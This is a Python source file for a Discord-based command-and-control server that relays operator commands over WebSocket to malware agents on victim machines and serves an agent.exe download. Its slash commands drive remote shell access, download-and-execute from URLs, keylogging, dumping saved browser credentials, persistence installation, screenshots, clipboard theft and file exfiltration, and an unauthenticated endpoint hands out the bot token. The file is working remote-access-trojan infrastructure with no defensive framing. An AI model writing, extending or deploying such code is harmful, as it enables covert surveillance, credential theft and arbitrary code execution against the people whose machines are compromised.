#!/usr/bin/env python3
"""
Discord C2 Bot - Middleman Architecture
Handles Discord interactions and relays commands to agents via WebSocket.
"""

import discord
from discord import app_commands
from discord.ext import commands, tasks
import os
import asyncio
from aiohttp import web, WSMsgType
from datetime import datetime, timezone, timedelta
import re
import logging
import base64
import aiohttp
import json

# ------------------- CONFIGURATION -------------------
BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
GUILD_ID = int(os.getenv("DISCORD_GUILD_ID", 0))
CONTROL_CHANNEL_NAME = os.getenv("CONTROL_CHANNEL", "control")
AGENT_CHANNEL_PREFIX = os.getenv("AGENT_PREFIX", "agent-")
STALE_THRESHOLD_MINUTES = int(os.getenv("STALE_THRESHOLD_MINUTES", 5))
PORT = int(os.getenv("PORT", 10000))
ADMIN_ROLE_NAME = os.getenv("ADMIN_ROLE", "Admin")

GITHUB_RELEASE_URL = os.getenv("GITHUB_RELEASE_URL")
if not GITHUB_RELEASE_URL:
    raise ValueError("GITHUB_RELEASE_URL environment variable not set")

if not BOT_TOKEN:
    raise ValueError("DISCORD_BOT_TOKEN environment variable not set")
if not GUILD_ID:
    raise ValueError("DISCORD_GUILD_ID environment variable not set")

# ------------------- LOGGING -------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger("bot")

# ------------------- CACHE FOR agent.exe -------------------
_binary_cache = None
_cache_timestamp = None
CACHE_TTL = timedelta(minutes=5)

async def fetch_agent_binary():
    global _binary_cache, _cache_timestamp
    now = datetime.now(timezone.utc)
    if _binary_cache is not None and _cache_timestamp is not None:
        if now - _cache_timestamp < CACHE_TTL:
            logger.debug("Returning cached agent binary")
            return _binary_cache
    logger.info("Fetching agent.exe from GitHub release...")
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(GITHUB_RELEASE_URL) as resp:
                if resp.status != 200:
                    logger.error(f"GitHub returned {resp.status}")
                    return None
                data = await resp.read()
                _binary_cache = data
                _cache_timestamp = now
                return data
        except Exception as e:
            logger.error(f"Failed to fetch from GitHub: {e}")
            return None

# ------------------- BOT SETUP -------------------
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.messages = True

class MyBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        guild = discord.Object(id=GUILD_ID)
        self.tree.copy_global_to(guild=guild)
        await self.tree.sync(guild=guild)
        logger.info("Slash commands synced")

bot = MyBot()

# ------------------- AGENT WEBSOCKET TRACKING -------------------
# agent_id -> websocket connection
connected_agents = {}
# agent_id -> last heartbeat timestamp
agent_heartbeats = {}
# agent_id -> channel_id (Discord text channel for this agent)
agent_channels = {}
# lock for shared dicts
agent_lock = asyncio.Lock()

def get_agent_by_channel(channel_id):
    for aid, cid in agent_channels.items():
        if cid == channel_id:
            return aid
    return None

async def send_to_agent(agent_id, msg_type, data):
    """Send a JSON message to the agent via WebSocket."""
    ws = connected_agents.get(agent_id)
    if not ws or ws.closed:
        return False
    try:
        await ws.send_json({
            "type": msg_type,
            "agent_id": agent_id,
            "data": data
        })
        return True
    except Exception as e:
        logger.error(f"Failed to send to agent {agent_id}: {e}")
        return False

# ------------------- DISCORD UTILITIES -------------------
async def find_or_create_agent_channel(guild, agent_id):
    """Find existing agent channel or create a new one."""
    channel_name = f"{AGENT_CHANNEL_PREFIX}{agent_id}"
    for ch in guild.text_channels:
        if ch.name == channel_name:
            return ch
    # Create new channel
    overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
    }
    # Add admin role if exists
    admin_role = discord.utils.get(guild.roles, name=ADMIN_ROLE_NAME)
    if admin_role:
        overwrites[admin_role] = discord.PermissionOverwrite(read_messages=True)
    channel = await guild.create_text_channel(channel_name, overwrites=overwrites)
    logger.info(f"Created channel #{channel_name} for agent {agent_id}")
    return channel

async def forward_agent_output(agent_id, content, is_file=False, filename=None):
    """Send agent output to its Discord channel."""
    channel_id = agent_channels.get(agent_id)
    if not channel_id:
        logger.warning(f"No channel found for agent {agent_id}")
        return
    channel = bot.get_channel(channel_id)
    if not channel:
        logger.warning(f"Channel {channel_id} not found for agent {agent_id}")
        return
    try:
        if is_file:
            # Data is base64-encoded file content
            file_data = base64.b64decode(content)
            await channel.send(file=discord.File(io.BytesIO(file_data), filename or "output"))
        else:
            # Text output, maybe truncate
            text = base64.b64decode(content).decode('utf-8', errors='replace')
            if len(text) > 1900:
                # Send as file if too long
                await channel.send(file=discord.File(io.BytesIO(text.encode()), "output.txt"))
            else:
                await channel.send(f"```\n{text}\n```")
    except Exception as e:
        logger.error(f"Error forwarding output for {agent_id}: {e}")

async def update_heartbeat_message(channel, agent_id):
    """Update the persistent heartbeat message in the agent channel."""
    async for msg in channel.history(limit=20):
        if msg.author == bot.user and "**Agent**" in msg.content and agent_id in msg.content:
            content = f"**Agent `{agent_id}` connected**\n**Last seen:** {datetime.now(timezone.utc).isoformat()}"
            await msg.edit(content=content)
            return msg
    # Create new heartbeat message
    content = f"**Agent `{agent_id}` connected**\n**Last seen:** {datetime.now(timezone.utc).isoformat()}"
    return await channel.send(content)

# ------------------- WEBSOCKET HANDLER FOR AGENTS -------------------
async def websocket_handler(request):
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    
    agent_id = None
    try:
        async for msg in ws:
            if msg.type == WSMsgType.TEXT:
                try:
                    data = json.loads(msg.data)
                except json.JSONDecodeError:
                    continue
                
                msg_type = data.get("type")
                
                if msg_type == "register":
                    agent_id = data.get("agent_id")
                    if not agent_id:
                        await ws.close()
                        return ws
                    
                    async with agent_lock:
                        # If agent already connected, close old connection
                        old_ws = connected_agents.pop(agent_id, None)
                        if old_ws:
                            await old_ws.close()
                        connected_agents[agent_id] = ws
                        agent_heartbeats[agent_id] = datetime.now(timezone.utc)
                    
                    # Ensure Discord channel exists
                    guild = bot.get_guild(GUILD_ID)
                    if guild:
                        channel = await find_or_create_agent_channel(guild, agent_id)
                        async with agent_lock:
                            agent_channels[agent_id] = channel.id
                        await update_heartbeat_message(channel, agent_id)
                        logger.info(f"Agent {agent_id} registered via WebSocket")
                    
                    # Send acknowledgment
                    await ws.send_json({"type": "registered", "agent_id": agent_id})
                
                elif msg_type == "heartbeat":
                    if agent_id:
                        async with agent_lock:
                            agent_heartbeats[agent_id] = datetime.now(timezone.utc)
                        # Optionally update Discord heartbeat message
                        channel_id = agent_channels.get(agent_id)
                        if channel_id:
                            channel = bot.get_channel(channel_id)
                            if channel:
                                await update_heartbeat_message(channel, agent_id)
                
                elif msg_type == "output":
                    if agent_id:
                        await forward_agent_output(agent_id, data.get("data", ""), is_file=False)
                
                elif msg_type == "file":
                    if agent_id:
                        await forward_agent_output(agent_id, data.get("data", ""), is_file=True, filename="file.bin")
                
                elif msg_type == "error":
                    if agent_id:
                        content = data.get("data", "Unknown error")
                        await forward_agent_output(agent_id, base64.b64encode(content.encode()).decode(), is_file=False)
            
            elif msg.type == WSMsgType.ERROR:
                logger.error(f"WebSocket error: {ws.exception()}")
                break
    finally:
        if agent_id:
            async with agent_lock:
                if connected_agents.get(agent_id) == ws:
                    del connected_agents[agent_id]
            logger.info(f"Agent {agent_id} disconnected")
    return ws

# ------------------- HTTP SERVER HANDLERS -------------------
async def handle_health(request):
    return web.Response(text="OK")

async def handle_agent_download(request):
    data = await fetch_agent_binary()
    if data is None:
        return web.Response(text="Agent binary unavailable", status=503)
    return web.Response(body=data, content_type="application/octet-stream")

async def handle_token(request):
    token = os.getenv("DISCORD_BOT_TOKEN")
    if not token:
        return web.Response(text="Token not configured", status=500)
    encoded = base64.b64encode(token.encode()).decode()
    return web.Response(text=encoded)

app = web.Application()
app.router.add_get("/", handle_health)
app.router.add_get("/health", handle_health)
app.router.add_get("/agent.exe", handle_agent_download)
app.router.add_get("/hi", handle_token)
app.router.add_get("/ws", websocket_handler)  # WebSocket endpoint for agents

async def start_http_server():
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    logger.info(f"HTTP server running on port {PORT}")

# ------------------- BACKGROUND CLEANUP TASK -------------------
@tasks.loop(minutes=1)
async def clean_stale_agents():
    now = datetime.now(timezone.utc)
    async with agent_lock:
        stale = []
        for agent_id, last_seen in agent_heartbeats.items():
            if now - last_seen > timedelta(minutes=STALE_THRESHOLD_MINUTES):
                stale.append(agent_id)
        for agent_id in stale:
            # Remove from tracking
            connected_agents.pop(agent_id, None)
            agent_heartbeats.pop(agent_id, None)
            channel_id = agent_channels.pop(agent_id, None)
            if channel_id:
                channel = bot.get_channel(channel_id)
                if channel:
                    try:
                        await channel.delete()
                        logger.info(f"Deleted stale agent channel {channel.name}")
                    except Exception as e:
                        logger.error(f"Failed to delete channel {channel_id}: {e}")

@clean_stale_agents.before_loop
async def before_clean_stale_agents():
    await bot.wait_until_ready()

# ------------------- DISCORD EVENTS -------------------
@bot.event
async def on_ready():
    logger.info(f"Logged in as {bot.user}")
    guild = bot.get_guild(GUILD_ID)
    if guild:
        control = discord.utils.get(guild.channels, name=CONTROL_CHANNEL_NAME)
        if not control:
            await guild.create_text_channel(CONTROL_CHANNEL_NAME)
            logger.info(f"Created #{CONTROL_CHANNEL_NAME} channel")
    clean_stale_agents.start()

# ------------------- SLASH COMMANDS -------------------
async def send_command_to_agent(interaction: discord.Interaction, cmd_text: str):
    """Send command to agent via WebSocket."""
    channel = interaction.channel
    if not channel.name.startswith(AGENT_CHANNEL_PREFIX):
        await interaction.response.send_message("❌ This command can only be used in an agent channel.", ephemeral=True)
        return False
    agent_id = get_agent_by_channel(channel.id)
    if not agent_id:
        await interaction.response.send_message("❌ No active agent associated with this channel.", ephemeral=True)
        return False
    success = await send_to_agent(agent_id, "cmd", cmd_text)
    if success:
        await interaction.response.send_message(f"✅ Command `{cmd_text}` sent to agent.", ephemeral=True)
    else:
        await interaction.response.send_message("❌ Agent is not connected.", ephemeral=True)
    return success

@bot.tree.command(name="run", description="Execute a shell command")
async def run_command(interaction: discord.Interaction, command: str):
    await send_command_to_agent(interaction, f"run {command}")

@bot.tree.command(name="screenshot", description="Take a screenshot")
async def screenshot_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "screenshot")

@bot.tree.command(name="kill", description="Terminate the agent")
async def kill_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "kill")

@bot.tree.command(name="sysinfo", description="Get detailed system information")
async def sysinfo_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "sysinfo")

@bot.tree.command(name="downloadexec", description="Download a file from URL and execute it")
async def download_exec_command(interaction: discord.Interaction, url: str, args: str = ""):
    cmd = f"downloadexec {url} {args}".strip()
    await send_command_to_agent(interaction, cmd)

@bot.tree.command(name="clipboard", description="Get or set clipboard content")
async def clipboard_command(interaction: discord.Interaction, action: str, text: str = ""):
    if action.lower() not in ["get", "set"]:
        await interaction.response.send_message("❌ Action must be 'get' or 'set'.", ephemeral=True)
        return
    if action == "set" and not text:
        await interaction.response.send_message("❌ You must provide text to set.", ephemeral=True)
        return
    cmd = f"clipboard {action} {text}".strip()
    await send_command_to_agent(interaction, cmd)

@bot.tree.command(name="ps", description="List running processes")
async def ps_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "ps")

@bot.tree.command(name="killpid", description="Kill a process by PID")
async def killpid_command(interaction: discord.Interaction, pid: int):
    await send_command_to_agent(interaction, f"killpid {pid}")

@bot.tree.command(name="keylog_start", description="Start keylogger")
async def keylog_start_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "keylog_start")

@bot.tree.command(name="keylog_stop", description="Stop keylogger and get logs")
async def keylog_stop_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "keylog_stop")

@bot.tree.command(name="creds", description="Dump saved browser credentials")
async def creds_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "creds")

@bot.tree.command(name="persist", description="Install persistence")
async def persist_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "persist")

@bot.tree.command(name="unpersist", description="Remove persistence")
async def unpersist_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "unpersist")

@bot.tree.command(name="upload", description="Upload a file from the agent")
async def upload_command(interaction: discord.Interaction, path: str):
    await send_command_to_agent(interaction, f"upload {path}")

@bot.tree.command(name="download", description="Download a file to the agent")
async def download_command(interaction: discord.Interaction, url: str, filename: str):
    await send_command_to_agent(interaction, f"download {url} {filename}")

@bot.tree.command(name="shell", description="Start an interactive shell session")
async def shell_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "shell")

@bot.tree.command(name="shell_stop", description="Stop the interactive shell")
async def shell_stop_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "shell_stop")

@bot.tree.command(name="update", description="Force the agent to self‑update")
async def update_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "update")

@bot.tree.command(name="message", description="Display a pop-up message on the target")
async def message_command(interaction: discord.Interaction, text: str):
    await send_command_to_agent(interaction, f"message {text}")

@bot.tree.command(name="wallpaper", description="Change the target's desktop wallpaper from a URL")
async def wallpaper_command(interaction: discord.Interaction, url: str):
    await send_command_to_agent(interaction, f"wallpaper {url}")

# ------------------- CONTROL CHANNEL COMMANDS (legacy) -------------------
@bot.command(name="agents")
async def list_agents(ctx):
    if ctx.channel.name != CONTROL_CHANNEL_NAME:
        await ctx.send("This command can only be used in the #control channel.")
        return
    async with agent_lock:
        if not connected_agents:
            await ctx.send("No agents currently connected.")
            return
        embed = discord.Embed(title="Active Agents", color=0x00ff00)
        for agent_id, ws in connected_agents.items():
            last_seen = agent_heartbeats.get(agent_id, datetime.min)
            channel_id = agent_channels.get(agent_id)
            channel_mention = f"<#{channel_id}>" if channel_id else "No channel"
            embed.add_field(
                name=f"Agent `{agent_id}`",
                value=f"Channel: {channel_mention}\nLast seen: {last_seen.isoformat()}",
                inline=False
            )
        await ctx.send(embed=embed)

# ------------------- MAIN -------------------
async def main():
    asyncio.create_task(start_http_server())
    await bot.start(BOT_TOKEN)

if __name__ == "__main__":
    import io  # for discord.File
    asyncio.run(main())
